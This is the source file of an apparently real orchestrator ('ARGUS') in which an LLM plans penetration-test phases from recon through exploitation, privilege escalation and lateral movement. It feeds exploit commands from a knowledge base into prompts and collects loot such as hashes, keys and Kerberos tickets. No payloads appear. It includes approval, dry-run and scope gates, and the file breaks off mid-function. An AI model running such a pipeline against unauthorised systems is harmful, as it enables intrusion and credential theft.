"""
ARGUS — Master Agent

Architecture:
  MasterAgent is the SOLE agent that communicates with the LLM.
  It does NOT execute tools directly. It:
    1. Checks LLM availability (halts if offline)
    2. Consults LLM to plan each phase
    3. Issues typed Instructions to specialist slave agents
    4. Receives results back via AgentBus
    5. Re-consults LLM to decide next steps based on results
    6. Broadcasts all reasoning to frontend so users see every decision

Pentest Methodology (OSCP/OSWE inspired):
  RECON → ENUM → VULN_ID → WEB_TESTING → EXPLOIT → POST_EXPLOIT → PRIVESC → REPORTING
  
  Each phase is LLM-driven: master asks "given these results, what should I try next?"
  If LLM is unresponsive at ANY point, testing stops and user is notified.
"""

import asyncio
import json
import os
import re
import sys
from typing import Optional, Dict, List, Any, Tuple
from datetime import datetime

# Phase 4 — bounded instruction cache (replaces unbounded plain dict)
try:
    from db.cache import BoundedInstructionCache as _BIC
    _BOUNDED_CACHE = True
except ImportError:
    _BOUNDED_CACHE = False

# Phase 5 — Hypothesis-driven reasoning engine (opt-in, graceful degradation)
try:
    from agents.reasoning.hypothesis_engine import HypothesisEngine
    from agents.reasoning.attack_planner    import AttackPlanner
    from agents.reasoning.decision_engine   import DecisionEngine
    from agents.reasoning.negative_memory   import NegativeMemory
    from agents.reasoning.reasoning_loop    import ReasoningLoop
    _REASONING_AVAILABLE = True
except ImportError:
    _REASONING_AVAILABLE = False

from agents.base_agent import BaseAgent, Instruction, agent_bus, BroadcastFn
from db.schemas import (
    AgentName, AgentStatus, AttackPhase, FindingSeverity,
    SessionStatus, WebSocketMessage
)
import db.mongo_client as db

# Architectural core — the engagement-wide reasoning context.  Provides
# the objective + react transcript + pinned insights + circuit breaker.
# Falls back gracefully if the module is unavailable (e.g. cold-start
# tests that skip the agents package) so this import never blocks
# legacy callers.
try:
    from agents.engagement_context import (
        EngagementContext,
        register_context as _ec_register,
        unregister_context as _ec_unregister,
    )
    _EC_AVAILABLE = True
except Exception:    # noqa: BLE001
    EngagementContext = None       # type: ignore[assignment]
    _ec_register      = None       # type: ignore[assignment]
    _ec_unregister    = None       # type: ignore[assignment]
    _EC_AVAILABLE     = False

# Findings-driven trigger system — declarative when→actions patterns.
try:
    from agents import finding_triggers as _ft
    _FT_AVAILABLE = True
except Exception:    # noqa: BLE001
    _ft = None                     # type: ignore[assignment]
    _FT_AVAILABLE = False

# Per-session end-to-end scan logger (file-based). Never raises.
from utils.scan_logger import (
    start_scan_logger, close_scan_logger, get_scan_logger,
)

# Meta-agents — plan auditor and findings validator
_META_AGENTS_IMPORT_ERROR: str = ""
try:
    from agents.meta.issue_validator_agent import IssueValidatorAgent
    from agents.meta.expert_agent          import RedTeamExpertAgent
    from agents.meta.correction            import (
        Correction, MAX_ADVISORY_CONTEXT, MAX_REPLAN_RETRIES
    )
    _META_AGENTS_AVAILABLE = True
except Exception as _meta_import_exc:
    # Catch ImportError, ModuleNotFoundError, AttributeError, etc.
    _META_AGENTS_AVAILABLE    = False
    _META_AGENTS_IMPORT_ERROR = str(_meta_import_exc)

# ── RAG Knowledge Base (graceful degradation if not installed) ─────────────────
try:
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "knowledge"))
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), "knowledge"))
    import knowledge_base as _kb
    _KB_AVAILABLE = True
except ImportError:
    _KB_AVAILABLE = False

def _kb_context(
    query: str,
    phase: str = None,
    outcome: str = None,
    phase_filter: str = None,
    outcome_filter: str = None,
    chunk_type_filter: str = None,
    top_k: int = 4
) -> str:
    """Return KB context string ready for LLM injection, or '' if KB not available/empty.
    Accepts both phase=/outcome= and phase_filter=/outcome_filter= naming conventions.
    chunk_type_filter: one of 'command', 'script', 'procedure', 'technique', 'tip', 'finding'
    """
    if not _KB_AVAILABLE:
        return ""
    _phase   = phase_filter or phase or None
    _outcome = outcome_filter or outcome or None
    try:
        return _kb.search(
            query,
            top_k=top_k,
            phase_filter=_phase,
            outcome_filter=_outcome,
            chunk_type_filter=chunk_type_filter,
        )
    except Exception:
        return ""


def _kb_commands(query: str, top_k: int = 4) -> str:
    """
    Fetch command-type KB chunks for the query and format them for LLM injection.
    Returns specific tool invocations, command-line examples, and exploit commands.
    Falls back to any chunk type if no command chunks found.
    """
    if not _KB_AVAILABLE:
        return ""
    try:
        commands = _kb.search_commands(query, top_k=top_k)
        if not commands:
            return ""
        lines = [
            "=== RELEVANT COMMANDS FROM KNOWLEDGE BASE ===",
        ]
        for i, cmd in enumerate(commands, 1):
            lines.append(f"[Example {i}]\n{cmd.strip()}")
        lines.append("=== END COMMANDS ===")
        lines.append("Adapt the above commands to your current target.")
        return "\n\n".join(lines)
    except Exception:
        return ""


def _kb_procedures(query: str, top_k: int = 3) -> str:
    """
    Fetch procedure-type KB chunks (step-by-step attack procedures).
    Returns numbered step sequences from writeups/reports.
    """
    if not _KB_AVAILABLE:
        return ""
    try:
        procs = _kb.search_procedures(query, top_k=top_k)
        if not procs:
            return ""
        lines = [
            "=== RELEVANT ATTACK PROCEDURES FROM KNOWLEDGE BASE ===",
        ]
        for i, proc in enumerate(procs, 1):
            lines.append(f"[Procedure {i}]\n{proc.strip()}")
        lines.append("=== END PROCEDURES ===")
        return "\n\n".join(lines)
    except Exception:
        return ""


def _fmt_svc(svc) -> str:
    """Convert a service value (dict OR str) to a readable string."""
    if isinstance(svc, dict):
        parts = []
        if svc.get("port"):
            parts.append(f"{svc['port']}/{svc.get('protocol','tcp')}")
        if svc.get("service"):
            parts.append(svc["service"])
        if svc.get("version"):
            parts.append(svc["version"])
        return " ".join(parts) if parts else str(svc)
    return str(svc) if svc else ""


def _fmt_svcs(svcs_dict, limit: int = 8) -> str:
    """Convert a services dict {port: dict|str} to a joined string for LLM prompts."""
    return " | ".join(
        _fmt_svc(v) for v in list(svcs_dict.values())[:limit]
    )


def _fmt_list(lst, limit: int = 8) -> str:
    """Safely convert any list of str|dict items to a joined string."""
    return " | ".join(
        (_fmt_svc(v) if isinstance(v, dict) else str(v))
        for v in list(lst)[:limit]
        if v
    )


def _safe_join(lst, sep: str = " ") -> str:
    """Join any list safely — handles str, dict, int, or mixed items.
    Used wherever LLM-returned lists are joined (LLM may return dicts instead of strings).
    """
    parts = []
    for item in (lst or []):
        if isinstance(item, dict):
            val = (item.get("name") or item.get("service") or item.get("title") or
                   item.get("type") or item.get("key") or item.get("value") or str(item))
            parts.append(str(val))
        else:
            parts.append(str(item))
    return sep.join(parts)


def _safe_list(val, default=None) -> list:
    """
    Return val as a list, or default/[] if val is None/non-list.
    Fixes 'NoneType not subscriptable' when LLM returns null for a list field.
    LLM JSON: {"steps": null} → .get("steps", []) returns None (key exists!)
    This wrapper ensures we always get an iterable.
    """
    if val is None:
        return default if default is not None else []
    if isinstance(val, list):
        return val
    if isinstance(val, dict):
        return [val]  # single dict → wrap in list
    return []


def _safe_str(val, default: str = "") -> str:
    """Return val as str, or default if None. Prevents None[:N] crashes."""
    if val is None:
        return default
    return str(val)


def _safe_dict(val) -> dict:
    """Return val as dict, or {} if val is None/non-dict (e.g. LLM returned list)."""
    if isinstance(val, dict):
        return val
    return {}


def _dedup_strings(lst) -> list:
    """
    Deduplicate a list of strings safely.
    Converts any non-string items (e.g. dicts returned by LLM) to strings first.
    Replaces list(set(lst)) which crashes on unhashable dict items.
    """
    seen = []
    out  = []
    for item in (lst or []):
        # Normalise to string so dicts never reach set()
        s = str(item) if not isinstance(item, str) else item
        if s not in seen:
            seen.append(s)
            out.append(s)
    return out


def _merge_string_lists(a: list, b: list) -> list:
    """
    Merge two lists of strings, deduplicating safely.
    Safe replacement for list(set(a + b)) when items might be dicts.
    """
    return _dedup_strings((a or []) + (b or []))


# ── Improvement #5 — opportunistic-pivot trigger events ──────────────────
# Event types that, when emitted, cause MasterAgent.notify_pivot_event to
# fire and let the reasoning loop dispatch any newly-applicable phases
# without waiting for the next iteration boundary.
_PIVOT_TRIGGER_EVENTS = frozenset({
    "credential_found",
    "shell_obtained",
    "flag_found",
    "privesc_success",
})


def _pivot_signature(event_type: str, payload: Any) -> str:
    """Stable signature for pivot deduplication.

    Same credential / shell / flag emitted twice should pivot only once.
    Falls back to a JSON-ish hash when the payload shape is unknown.
    """
    try:
        if not isinstance(payload, dict):
            return f"{event_type}:{repr(payload)[:120]}"
        if event_type == "credential_found":
            return f"cred:{payload.get('user','?')}@{payload.get('host','?')}:{payload.get('service','?')}"
        if event_type == "shell_obtained":
            return f"shell:{payload.get('rhost','?')}:{payload.get('rport','?')}:{payload.get('shell_id','?')}"
        if event_type == "flag_found":
            return f"flag:{payload.get('flag_type','?')}:{(payload.get('value','') or '')[:40]}"
        if event_type == "privesc_success":
            return f"privesc:{payload.get('shell_id','?')}:{payload.get('new_user','?')}"
        # Generic fallback — use a small subset of keys
        keys = sorted(k for k in payload.keys() if k != "ts")[:4]
        return f"{event_type}:" + ",".join(f"{k}={str(payload.get(k))[:30]}" for k in keys)
    except Exception:
        return f"{event_type}:?"


class MasterAgent(BaseAgent):
    """
    LLM-driven orchestrator. Only agent that thinks.
    Issues Instructions to slave agents and reacts to their results.
    """

    def __init__(self, broadcast: Optional[BroadcastFn] = None):
        super().__init__(AgentName.MASTER, broadcast)
        self.phase = AttackPhase.RECON

        # Child agents (created lazily)
        self._recon_agent   = None
        self._vuln_agent    = None
        self._web_agent     = None
        self._osint_agent   = None
        self._exploit_agent = None
        self._privesc_agent = None
        self._shell_agent         = None
        self._payload_agent       = None
        self._attack_graph_agent  = None   # background chain analyzer

        # ── Meta-agents (plan auditor + findings validator + expert) ───
        self._meta_agents_enabled:   bool                    = True
        self._issue_validator:       Optional[Any]           = None
        self._expert:                Optional[Any]           = None
        self._pending_corrections:   asyncio.Queue           = asyncio.Queue()
        self._meta_advisory_context: List[str]               = []
        self._meta_listener_task:    Optional[asyncio.Task]  = None

        # Session config
        self._target:             str  = ""
        self._target_type:        str  = "unknown"
        self._auto_exploit:       bool = False
        self._confirm_web:        bool = False   # Gate web testing behind a confirmation popup
        self._web_phase_timeout:  int  = 600     # Seconds; 0 = unlimited
        self._phases_to_run:      List[str] = []

        # MCP tool catalog cache — fetched once per session, injected into LLM
        # planning prompts so the model can pick from the full Kali arsenal
        # rather than the small hardcoded hints embedded in each prompt.
        self._tool_catalog:       Dict[str, Dict] = {}     # {name: {bin, category, description}}
        self._tool_catalog_text:  str = ""                  # pre-formatted for prompt injection

        # Phase extension events — SET = user granted extension; cleared on each wait
        self._extend_events: Dict[str, asyncio.Event] = {}

        # Accumulated intelligence — updated throughout pentest
        self._intel: Dict = {
            "target":          "",
            "target_type":     "unknown",
            "open_ports":      [],
            "services":        {},     # {port: {service, version, protocol}}
            "os_guess":        "unknown",
            "web_paths":       [],
            "subdomains":      [],
            "technologies":    [],
            "vulnerabilities": [],
            "cves":            [],
            "exploit_modules": [],
            "credentials":     [],
            "web_vulns":       [],     # OWASP findings
            "shell_access":    False,
            "current_user":    None,
            "user_flag":       None,
            "root_flag":       None,
            "shell_id":        None,
            "attack_path":     [],     # Chronological attack steps taken
            # ── Extended fields for real pentest depth ──────────
            "users":              [],  # discovered usernames
            "shares":             [],  # SMB/NFS shares found
            "banners":            {},  # {port: raw banner string}
            "login_pages":        [],  # HTTP login forms found
            "interesting_files":  [],  # sensitive files/dirs found
            "service_versions":   {},  # {port: "Apache 2.4.49"}
            "raw_outputs":        {},  # {tool: last 2000 chars of stdout}
            "enum_findings":      [],  # structured findings from enumeration
            "default_creds_tried": [], # list of {service, user, pass, result}
            "open_services_detail": [], # human readable service descriptions
            "attack_surface_notes": "", # LLM's assessment of attack surface
            "operator_notes":     [],  # guidance injected by operator
            # ── Next-gen architecture fields ────────────────────
            "attack_tree":        None, # generated attack plan (nodes+edges+optimal_path)
            "mitre_techniques":   [],   # [{"id": "T1190", "name": "...", "tactic": "..."}]
            "lateral_targets":    [],   # IPs/hosts discovered post-exploitation
            "pivot_paths":        [],   # [{src, dst, method, creds}]
            "evidence":           [],   # captured evidence items
            "long_term_hits":     [],   # memories recalled and used this session
            "state":              "INIT",  # current state machine state
            # ── Phase 5 reasoning engine fields (safe defaults) ────
            "hypotheses":          [],    # list[dict] — Hypothesis objects
            "negative_memory":     [],    # list[dict] — FailedAttempt objects
            "confidence_scores":   {},    # {hypothesis_id: float}
            "action_score":        0,     # running engagement score
            "failed_attempts":     {},    # {"tool:service": count}
            "ranked_attack_paths": [],    # list[dict] — RankedAttackPath objects
            "reasoning_journal":   [],    # list[str] — situation assessments
            # ── Loot / exfil state (#7) ──────────────────────────
            "loot":                {        # populated by ExfilPipeline
                "ssh_keys":      [],
                "nt_hashes":     [],
                "kerberos_tgts": [],
                "kerberos_tgss": [],
                "secrets":       [],
            },
        }
        # ExfilPipeline instance — initialised lazily in run() once
        # the session_id is known.
        self._exfil_pipeline = None

        # ── Pentest State Machine ────────────────────────────
        # INIT → RECON → INTELLIGENCE_AGGREGATION → VULNERABILITY_ANALYSIS
        # → ATTACK_PLANNING → EXPLOITATION → POST_EXPLOITATION
        # → PRIVILEGE_ESCALATION → LATERAL_MOVEMENT → EVIDENCE_COLLECTION
        # → REPORT_GENERATION → COMPLETE
        self._state_transitions = {
            "INIT":                      "RECON",
            "RECON":                     "INTELLIGENCE_AGGREGATION",
            "INTELLIGENCE_AGGREGATION":  "VULNERABILITY_ANALYSIS",
            "VULNERABILITY_ANALYSIS":    "ATTACK_PLANNING",
            "ATTACK_PLANNING":           "EXPLOITATION",
            "EXPLOITATION":              "POST_EXPLOITATION",
            "POST_EXPLOITATION":         "PRIVILEGE_ESCALATION",
            "PRIVILEGE_ESCALATION":      "LATERAL_MOVEMENT",
            "LATERAL_MOVEMENT":          "EVIDENCE_COLLECTION",
            "EVIDENCE_COLLECTION":       "REPORT_GENERATION",
            "REPORT_GENERATION":         "COMPLETE",
        }

        # Confirmation events (for exploitation gating)
        self._confirm_events: Dict[str, asyncio.Event] = {}

        # Track which tools have already been run (prevents repetition)
        self._used_tools: Dict[str, int] = {}   # tool_name → run count

        # Operator notes and scope (set at run() start)
        self._notes: str = ""
        self._scope: str = ""

        # Mission brief (Improvement #1) — formal goal definition.  Holds the
        # validated MissionBrief Pydantic model; defaults are filled in by the
        # API layer before run() is called so this is never None mid-scan.
        self._mission_brief: Optional[Any] = None

        # Win-condition tracker (Improvement #2) — evaluates the brief's
        # win_conditions list against intel after every phase boundary.
        self._win_tracker: Optional[Any] = None
        self._win_snapshot: Dict[str, Any] = {}
        self._mission_complete_announced: bool = False

        # Opportunistic-pivot bookkeeping (Improvement #5).
        # Lock prevents concurrent _consider_pivots calls from racing on the
        # _phases_dispatched map; signature set tracks which discrete events
        # we've already pivoted on so a flood of duplicate emissions does
        # not re-trigger.
        self._pivot_lock: Optional[asyncio.Lock] = None
        self._pivot_seen: set = set()

        # User guidance queue — injected mid-run from frontend
        self._guidance_queue: asyncio.Queue = asyncio.Queue()

        # Results cache — avoids re-running identical instructions
        # Phase 4: bounded to 500 entries with 4-hour TTL to prevent memory bloat
        # on long engagements.  Falls back to plain dict if db.cache unavailable.
        self._instruction_cache = _BIC(maxsize=500, ttl=14_400.0) if _BOUNDED_CACHE \
                                   else {}  # type: ignore[assignment]

        # ── Phase 5: Hypothesis-driven reasoning engine ──────────────────
        # All fields default to None / False so the existing linear path is
        # completely unaffected when use_reasoning_loop=False (the default).
        self._use_reasoning_loop:  bool = False
        self._reasoning_loop_inst: Optional[ReasoningLoop] = None  # type: ignore[name-defined]
        self._hypothesis_engine:   Optional[HypothesisEngine] = None   # type: ignore[name-defined]
        self._decision_engine:     Optional[DecisionEngine] = None     # type: ignore[name-defined]
        self._attack_planner:      Optional[AttackPlanner] = None      # type: ignore[name-defined]
        self._negative_memory:     Optional[NegativeMemory] = None     # type: ignore[name-defined]

        # Improvement #11 — per-session noise budget.  Defaults to a moderate
        # authorised-pentest profile; reset/replaced in run() once operator
        # notes & scope are available so "stealth"/"red team"/"loud" hints
        # can re-tune the budget.
        try:
            from agents.reasoning.noise_budget import NoiseBudget as _NB, DEFAULT_BUDGET
            self.noise_budget: Optional[Any] = _NB(DEFAULT_BUDGET, mode="default")
        except Exception:
            self.noise_budget = None

        # Improvement #13 — dry-run mode for destructive ops.  Defaults to
        # ON (fail-safe); auto-derived in run() once engagement type and
        # operator notes are known so CTF/lab boxes flip it OFF.
        self.dry_run_mode: bool = True

        # Recommendation C — listener manager (lazy-init in run() so
        # self._auto_detect_lhost can resolve interfaces at the right
        # moment; tests / units that build a bare master see None).
        self.listener_manager: Optional[Any] = None

        # Background tasks — fire-and-forget asyncio.Task objects.
        # Tracked here so _wait_for_agents_idle can properly drain them before
        # report generation begins.
        self._background_tasks: List[asyncio.Task] = []

        # Pause / Resume support
        # _pause_event is SET (True) while the scan is running.
        # Calling pause() clears it; resume() sets it again.
        # Every phase boundary calls _check_pause() which awaits this event.
        self._pause_event: asyncio.Event = asyncio.Event()
        self._pause_event.set()   # start in running state

        # ── EngagementContext — the unified working memory ──────────────
        # Holds the objective, ReAct transcript, pinned insights, circuit
        # breaker state, and renders the canonical prompt prelude for every
        # LLM call.  Created lazily in run() when session_id is known.
        # All accesses must use ``self._context if self._context else``
        # because tests / cold-start paths may bypass run().
        self._context: Optional["EngagementContext"] = None
        # Operator-supplied mission text (free-form goal description).
        # When set, takes precedence over the auto-generated default
        # objective so a CTF box can say "capture user.txt + root.txt".
        self._operator_objective: str = ""
        # Once-per-session trigger firing memory.  Cleared at engagement
        # end so a fresh session starts with empty state.
        self._triggers_evaluated_phases: set = set()

        # Ordered list of phases that have already completed — used to skip
        # already-done phases when resuming from a checkpoint.
        self._phases_completed: List[str] = []

        # Master run-config snapshot — saved into checkpoints so resume() can
        # restore the full MasterAgent configuration.
        self._master_config: Dict = {}

    # ─── Async KB Helpers ─────────────────────────────────────
    # Offload CPU-bound embedding/reranking to thread pool so the async
    # event loop is never blocked.  Also emit rag_query WS events so the
    # Agent Console Comms tab shows every RAG query and its result.

    async def _kb(self, query: str, **kw) -> str:
        """Non-blocking KB context search. Runs in thread pool, emits rag_query."""
        if not _KB_AVAILABLE:
            return ""
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(None, lambda: _kb_context(query, **kw))
        if result:
            await self._emit("rag_query", {
                "agent": str(self.name),
                "phase": str(self.phase or ""),
                "query": query[:200],
                "result": result[:1000],
                "found": True,
            })
        return result

    async def _kbc(self, query: str, top_k: int = 4) -> str:
        """Non-blocking KB commands search. Runs in thread pool, emits rag_query."""
        if not _KB_AVAILABLE:
            return ""
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(None, lambda: _kb_commands(query, top_k=top_k))
        if result:
            await self._emit("rag_query", {
                "agent": str(self.name),
                "phase": str(self.phase or ""),
                "query": f"[cmds] {query[:180]}",
                "result": result[:1000],
                "found": True,
            })
        return result

    async def _kbp(self, query: str, top_k: int = 3) -> str:
        """Non-blocking KB procedures search. Runs in thread pool, emits rag_query."""
        if not _KB_AVAILABLE:
            return ""
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(None, lambda: _kb_procedures(query, top_k=top_k))
        if result:
            await self._emit("rag_query", {
                "agent": str(self.name),
                "phase": str(self.phase or ""),
                "query": f"[procs] {query[:180]}",
                "result": result[:1000],
                "found": True,
            })
        return result

    # ─── Win-condition tracking (Improvement #2) ──────────────────────────

    async def evaluate_win_conditions(self, phase: str = "") -> Dict[str, Any]:
        """Re-evaluate the mission's win conditions against current intel.

        Updates ``self._win_snapshot`` and ``self._intel['win_conditions']``,
        broadcasts a ``win_condition_update`` WS event, and emits a one-shot
        ``mission_complete`` event the first time every condition is achieved.
        Safe to call repeatedly — the tracker latches achieved conditions True.
        """
        if self._win_tracker is None:
            return {}
        try:
            snap = self._win_tracker.evaluate(self._intel)
        except Exception as exc:                                # noqa: BLE001
            import logging as _ml
            _ml.getLogger(__name__).warning("[win_conditions] evaluate failed: %s", exc)
            return {}

        self._win_snapshot = snap
        self._intel["win_conditions"] = snap

        try:
            await self._emit("win_condition_update", {
                "scan_id": self._session_id,
                "phase":   phase or str(self.phase or ""),
                **snap,
            })
        except Exception:
            pass

        # One-shot mission_complete announcement
        if snap.get("all_achieved") and not self._mission_complete_announced:
            self._mission_complete_announced = True
            try:
                await self._emit("mission_complete", {
                    "scan_id":      self._session_id,
                    "phase":        phase or str(self.phase or ""),
                    "achieved":     snap["achieved_count"],
                    "total":        snap["total"],
                    "conditions":   snap["conditions"],
                })
            except Exception:
                pass

        # Hand the latest snapshot to the Expert so the next directive prompt
        # is grounded in the current win-condition state.
        try:
            if self._expert is not None and hasattr(self._expert, "set_win_snapshot"):
                self._expert.set_win_snapshot(snap)
        except Exception:
            pass

        return snap

    # ─── Value-of-Information action scoring (Improvement #3) ─────────────

    def _voi_failed_pairs(self) -> Dict[str, int]:
        """Build a {tool:service -> failed_count} map from NegativeMemory."""
        out: Dict[str, int] = {}
        nm = getattr(self, "_negative_memory", None)
        if nm is None:
            return out
        try:
            # NegativeMemory exposes ._index as {(tool, service) -> count}
            idx = getattr(nm, "_index", None) or {}
            for key, count in idx.items():
                if isinstance(key, tuple) and len(key) == 2:
                    tool, svc = key
                    out[f"{(tool or '').lower()}:{svc or ''}".rstrip(":")] = int(count)
        except Exception:
            pass
        return out

    def score_action(self, action: Dict[str, Any]) -> Dict[str, Any]:
        """Score one candidate action using Value-of-Information.

        Returns the VoIBreakdown as a dict.  See agents.mission.voi_scorer.
        """
        try:
            from agents.mission.voi_scorer import score_action as _score
        except Exception:
            return {"score": 0, "factors": {}, "reasons": [], "dropped": False}
        brief_dict: Dict[str, Any] = {}
        if self._mission_brief is not None:
            try:
                brief_dict = self._mission_brief.model_dump()  # type: ignore[attr-defined]
            except Exception:
                try:
                    brief_dict = self._mission_brief.dict()    # type: ignore[attr-defined]
                except Exception:
                    brief_dict = {}
        b = _score(
            action        = action,
            intel         = self._intel,
            win_snapshot  = self._win_snapshot or {},
            used_tools    = dict(self._used_tools),
            failed_pairs  = self._voi_failed_pairs(),
            mission_brief = brief_dict,
        )
        return b.to_dict()

    def rank_actions(self, actions: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Rank candidate actions by Value-of-Information."""
        try:
            from agents.mission.voi_scorer import rank_actions as _rank
        except Exception:
            return list(actions or [])
        brief_dict: Dict[str, Any] = {}
        if self._mission_brief is not None:
            try:
                brief_dict = self._mission_brief.model_dump()  # type: ignore[attr-defined]
            except Exception:
                try:
                    brief_dict = self._mission_brief.dict()    # type: ignore[attr-defined]
                except Exception:
                    brief_dict = {}
        return _rank(
            actions       = actions or [],
            intel         = self._intel,
            win_snapshot  = self._win_snapshot or {},
            used_tools    = dict(self._used_tools),
            failed_pairs  = self._voi_failed_pairs(),
            mission_brief = brief_dict,
        )

    # ─── Engagement provenance (per session+target) ───────────
    def _engagement_origin(self) -> Dict[str, str]:
        """Identity of the CURRENT engagement (session + target).  Mirrors
        OperatorCore._engagement_origin so evidence stamped by either side
        compares equal."""
        return {
            "session_id": str(getattr(self, "_session_id", "") or ""),
            "target": str(self._intel.get("target_host") or self._intel.get("target") or ""),
        }

    def _scrub_foreign_evidence(self, intel: Dict[str, Any], current: Dict[str, str]) -> int:
        """Drop evidence carried into intel that originated in a DIFFERENT
        engagement (the Niagara/Fox bleed: a prior run's findings/loot surfaced
        as current).  Returns the count removed.  Config, scope, target and
        cross-session knowledge are untouched — only known-foreign *evidence*
        (findings / loot) is removed.  An item with no `_origin` is 'unknown'
        and kept (it cannot be proven foreign)."""
        def _keep(item) -> bool:
            o = item.get("_origin") if isinstance(item, dict) else None
            if not o:
                return True
            return (str(o.get("session_id", "")) == current.get("session_id", "")
                    and str(o.get("target", "")) == current.get("target", ""))
        removed = 0
        v = intel.get("findings")
        if isinstance(v, list):
            before = len(v); intel["findings"] = [x for x in v if _keep(x)]; removed += before - len(intel["findings"])
        loot = intel.get("loot")
        if isinstance(loot, list):
            before = len(loot); intel["loot"] = [x for x in loot if _keep(x)]; removed += before - len(intel["loot"])
        elif isinstance(loot, dict) and isinstance(loot.get("items"), list):
            before = len(loot["items"]); loot["items"] = [x for x in loot["items"] if _keep(x)]; removed += before - len(loot["items"])
        return removed

    async def _preflight_reachable(self, host: str) -> bool:
        """Best-effort reachability probe at scan start.  Returns True UNLESS we
        have positive evidence the target is unreachable (fail-open — never block
        a run on a flaky probe).  Catches the tun0-down case where every packet
        was 'Network is unreachable' yet ARGUS scanned for minutes anyway."""
        import asyncio as _a
        if not host:
            return True
        async def _try(port: int) -> bool:
            try:
                r, w = await _a.wait_for(_a.open_connection(host, port), timeout=3)
                try:
                    w.close()
                except Exception:
                    pass
                return True
            except Exception:
                return False
        cands = []
        for p in (list(self._intel.get("open_ports") or [])[:3] or [80, 443, 22]):
            try:
                cands.append(int(p))
            except Exception:
                pass
        if not cands:
            return True
        results = await _a.gather(*[_try(p) for p in cands[:3]], return_exceptions=True)
        # Unreachable only if EVERY probe failed (any success ⇒ reachable).
        return any(r is True for r in results)

    # ─── Main Entry Point ─────────────────────────────────────

    async def run(
        self,
        session_id:         str,
        target:             str,
        target_type:        str  = "unknown",
        auto_exploit:       bool = False,
        confirm_web:        bool = False,
        web_phase_timeout:  int  = 600,
        threading_enabled:  bool = False,
        max_threads:        int  = 3,
        phases:             List[str] = None,
        notes:              str  = "",
        scope:              str  = "",
        checkpoint_id:      Optional[str] = None,   # resume from checkpoint
        use_reasoning_loop: bool = False,            # enable hypothesis-driven engine
        mission_brief:      Optional[Any] = None,    # Improvement #1 — formal mission
        objective:          str  = "",               # operator-supplied goal text
        autonomy:           str  = "",               # operator-core autonomy for this scan
        token_budget_per_target: int = 0,            # human-set LLM-token cap for THIS target (0 = unlimited)
        max_seconds: int = 0,                         # per-host depth budget (0 = use operator default)
        **kwargs
    ) -> Dict:
        self._use_reasoning_loop = _REASONING_AVAILABLE  # Always use reasoning if available
        # Per-scan operator autonomy (UI/selectable) overrides the env default.
        self._operator_autonomy = (autonomy or "").strip().lower() or os.environ.get(
            "ARGUS_OPERATOR_AUTONOMY", "approve_to_exploit")
        # Human-set per-target LLM-token budget.  Each MasterAgent.run() drives ONE
        # target (CIDR/domain scans spawn one master per host), so this IS the
        # per-target cap.  0 = unlimited (ARGUS never imposes its own limit — only
        # the human does).  When real token usage on this target reaches it, the
        # operator PAUSES and asks the human to extend or cut off (see
        # OperatorCore._token_budget_gate).  Accounting lives in self._tokens_used.
        try:
            self._token_budget_per_target = max(0, int(token_budget_per_target or 0))
        except Exception:
            self._token_budget_per_target = 0
        self._tokens_used = int(getattr(self, "_tokens_used", 0) or 0)
        # Optional per-host depth budget (used by the CIDR exploit phase so a
        # stalled host hands off its slot).  0 = use the operator's env default.
        try:
            self._operator_max_seconds = max(0, int(max_seconds or 0))
        except Exception:
            self._operator_max_seconds = 0
        self._session_id     = session_id
        # Stash operator-supplied objective so the EngagementContext
        # init below picks it up.
        if objective and objective.strip():
            self._operator_objective = objective.strip()

        # ── Target normalisation (NEW: domain / URL / app support) ──────
        # Classify the operator-supplied target string into ip / cidr /
        # hostname / url / app and stash all four facets on intel so
        # downstream consumers (web phase, primers, scope guard) can use
        # the right form for the right tool.  Every existing IP / CIDR
        # path is bit-exact preserved because for those kinds, host==raw.
        try:
            from utils.target_normalizer import normalise_target
            _norm = normalise_target(
                target,
                target_type_hint = target_type,
                resolve_dns      = True,
            )
        except Exception as _norm_err:
            # If normalisation itself blows up, fall back to legacy behaviour
            # so the engagement still launches.
            _norm = type("NT", (), {
                "raw": target, "kind": "hostname", "host": target, "url": None,
                "port": None, "scheme": None, "resolved_ip": None,
                "scope_hosts": [target], "primary_for_tools": lambda: target,
                "primary_url": lambda: None, "to_dict": lambda: {"raw": target},
            })()
            import logging as _l
            _l.getLogger(__name__).warning(
                "[target] normalise_target failed: %s — using legacy mode", _norm_err,
            )

        # `self._target` stays as the raw form for backwards compatibility
        # of every existing call site.  The tool-friendly host form is
        # available as self._target_host for new code paths.
        self._target          = target
        self._target_host     = _norm.primary_for_tools() if hasattr(_norm, "primary_for_tools") else target
        self._target_url      = _norm.primary_url() if hasattr(_norm, "primary_url") else None
        self._target_kind     = _norm.kind
        self._target_type    = target_type
        self._auto_exploit        = auto_exploit
        self._confirm_web         = confirm_web
        self._web_phase_timeout   = web_phase_timeout
        self._intel["target"]     = target
        self._intel["target_type"] = target_type
        # AI / LLM target adapter config (target_type == 'ai'); empty otherwise.
        self._intel["ai_target"]  = kwargs.get("ai_target") or {}
        # Human-set scan-intrusiveness ceiling (safe|intrusive|disruptive) — the
        # safety gate for technology-capability quick-wins (#5). Safe by default.
        self._intel["scan_intrusiveness"] = (kwargs.get("scan_intrusiveness") or "safe")
        # Optional PCAP/SPAN capture for passive-first OT fingerprinting (#5 S2).
        if kwargs.get("pcap_path"):
            self._intel["pcap_path"] = kwargs.get("pcap_path")
        # New intel fields surfaced to ALL consumers
        self._intel["target_kind"]   = _norm.kind
        self._intel["target_host"]   = self._target_host
        self._intel["target_url"]    = self._target_url
        self._intel["target_scope"]  = list(getattr(_norm, "scope_hosts", []) or [target])
        self._intel["target_resolved_ip"] = getattr(_norm, "resolved_ip", None)
        self._phases_to_run  = phases or [p.value for p in AttackPhase]

        # ── Engagement provenance + scrub-on-seed ──────────────────────
        # Stamp this engagement's identity, then drop any evidence carried in
        # (via a shared intel object / seeded state) that belongs to a DIFFERENT
        # engagement.  This is the root-cause fix for prior-run findings (e.g. a
        # Niagara/Fox box from a previous session) surfacing as CURRENT loot and
        # progress.  Cross-session knowledge/lessons are untouched.
        self._intel["_origin"] = self._engagement_origin()
        try:
            _rm = self._scrub_foreign_evidence(self._intel, self._intel["_origin"])
            if _rm:
                import logging as _l
                _l.getLogger(__name__).info("scrubbed %d foreign-origin evidence item(s) at seed", _rm)
        except Exception:
